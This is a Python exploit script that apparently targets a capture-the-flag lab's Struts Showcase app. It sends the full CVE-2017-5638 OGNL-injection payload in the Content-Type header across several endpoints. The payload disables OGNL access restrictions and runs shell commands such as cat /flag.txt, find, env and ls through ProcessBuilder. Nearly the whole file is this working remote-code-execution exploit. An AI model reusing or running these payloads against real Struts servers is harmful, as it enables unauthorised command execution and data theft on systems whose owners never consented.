#!/usr/bin/env python3
import requests
import sys
import urllib.parse

target_base = "http://ognl.vulnmachines.com:8877/struts-showcase"

# More sophisticated OGNL payloads
payloads = {
    "CVE-2017-5638": {
        "method": "POST",
        "headers": {
            "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /flag.txt').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }
    },
    "CVE-2017-5638_alt": {
        "method": "POST", 
        "headers": {
            "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='find / -name \"*flag*\" -type f 2>/dev/null | head -10').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }
    },
    "CVE-2017-5638_ls": {
        "method": "POST",
        "headers": {
            "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -la /').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }
    },
    "CVE-2017-5638_pwd": {
        "method": "POST",
        "headers": {
            "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='pwd; ls -la').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }
    },
    "CVE-2017-5638_env": {
        "method": "POST",
        "headers": {
            "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env | grep -i flag').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }
    }
}

# Test all endpoints
endpoints = [
    "",
    "/index.action", 
    "/login.action",
    "/showcase.action",
    "/help.action",
    "/test.action",
    "/admin.action"
]

print("[*] Testing OGNL Injection on Struts Showcase")
print("="*60)

for endpoint in endpoints:
    url = target_base + endpoint
    print(f"\n[*] Testing endpoint: {endpoint if endpoint else '/'}")
    print("-"*40)
    
    for name, payload_data in payloads.items():
        print(f"  [>] Testing {name}...")
        
        try:
            if payload_data["method"] == "POST":
                r = requests.post(url, headers=payload_data.get("headers", {}), timeout=5)
            else:
                r = requests.get(url, headers=payload_data.get("headers", {}), timeout=5)
            
            # Check if we got command output
            lines = r.text.split('\n')
            
            # Look for signs of command execution
            if 'total' in r.text and 'drwxr' in r.text:  # ls output
                print(f"    [+] Command execution successful!")
                # Extract the command output
                start = False
                for line in lines:
                    if 'total' in line:
                        start = True
                    if start and line.strip():
                        print(f"      {line[:100]}")
                        if 'flag' in line.lower():
                            print(f"    [!!!] FLAG REFERENCE FOUND: {line}")
                break
                
            elif 'vnm{' in r.text:
                print(f"    [!!!] FLAG FOUND!")
                for line in lines:
                    if 'vnm{' in line:
                        print(f"    [FLAG]: {line.strip()}")
                break
                
            elif 'bin' in r.text and 'boot' in r.text and 'dev' in r.text:
                print(f"    [+] Directory listing successful!")
                for line in lines[:20]:
                    if line.strip() and not line.startswith('<'):
                        print(f"      {line.strip()[:80]}")
                break
                
            elif len(r.text) < 500 and not r.text.startswith('<!DOCTYPE'):
                print(f"    [?] Short response, might be command output:")
                print(f"      {r.text[:200]}")
                
        except requests.exceptions.Timeout:
            print(f"    [-] Timeout")
        except Exception as e:
            print(f"    [-] Error: {str(e)[:50]}")

print("\n" + "="*60)
print("[*] Testing direct command injection with different commands...")

# Try more direct approaches
commands = [
    "cat /flag.txt",
    "cat flag.txt", 
    "cat ../flag.txt",
    "cat ../../flag.txt",
    "find / -name flag.txt 2>/dev/null",
    "grep -r vnm /",
    "ls -la /tmp",
    "ls -la /var/www",
    "ls -la /opt"
]

for cmd in commands:
    print(f"\n[*] Trying command: {cmd}")
    
    payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    
    headers = {"Content-Type": payload}
    
    try:
        r = requests.post(target_base, headers=headers, timeout=5)
        
        if 'vnm{' in r.text:
            print("[!!!] FLAG FOUND!")
            for line in r.text.split('\n'):
                if 'vnm{' in line:
                    print(f"FLAG: {line.strip()}")
                    sys.exit(0)
        elif len(r.text) < 1000 and not r.text.startswith('<!DOCTYPE'):
            print(f"Output: {r.text[:200]}")
    except:
        pass